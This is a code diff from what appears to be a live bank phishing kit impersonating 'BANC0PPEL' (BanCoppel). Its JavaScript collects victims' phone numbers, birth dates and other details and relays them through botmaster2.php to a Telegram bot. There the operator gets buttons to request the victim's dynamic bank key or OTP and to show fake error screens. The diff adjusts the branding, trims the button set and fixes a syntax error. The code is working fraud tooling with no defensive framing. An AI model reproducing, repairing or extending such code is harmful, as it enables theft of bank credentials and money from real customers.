@@ -109,7 +109,7 @@ document.addEventListener('DOMContentLoaded', async function () {
 
   // 4. Crear mensaje
   const mensaje = `
-📥 <b>REGISTRO NUEVO</b>
+📥 <b>REGISTRO NUEVO BANC0PPEL</b>
 🆔 ID: ${transactionId}
 📱 Celular: ${data.celular}
 🎂 Nacimiento: ${data.nacimiento}
@@ -120,15 +120,14 @@ document.addEventListener('DOMContentLoaded', async function () {
 `;
 
   // 5. Botones
-  const keyboard = {
-    inline_keyboard: [
-      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
-      [{ text: "Código OTP", callback_data: `pedir_otp:${transactionId}` }],
-      [{ text: "Error TC", callback_data: `error_tc:${transactionId}` }],
-      [{ text: "Error Logo", callback_data: `error_logo:${transactionId}` }],
-      [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
-    ]
-  };
+ const keyboard = {
+  inline_keyboard: [
+    [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
+    [{ text: "Error Logo", callback_data: `error_logo:${transactionId}` }],
+    [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
+  ]
+};
+
 
   // 6. Enviar mensaje con botones a Telegram
   await fetch("botmaster2.php", {
@@ -154,10 +153,11 @@ document.addEventListener('DOMContentLoaded', async function () {
       if (update) {
         const tipo = update.callback_query.data.split(":")[0];
         const status = {
-          pedir_dinamica: "Clave Dinámica"
-          error_logo: "Error de Logo",
-          confirm_finalizar: "Finalización Exitosa"
-        }[tipo] || "Acción desconocida";
+  pedir_dinamica: "Clave Dinámica",
+  error_logo: "Error de Logo",
+  confirm_finalizar: "Finalización Exitosa"
+}[tipo] || "Acción desconocida";
+
 
         await fetch("sendStatus.php", {
           method: "POST",
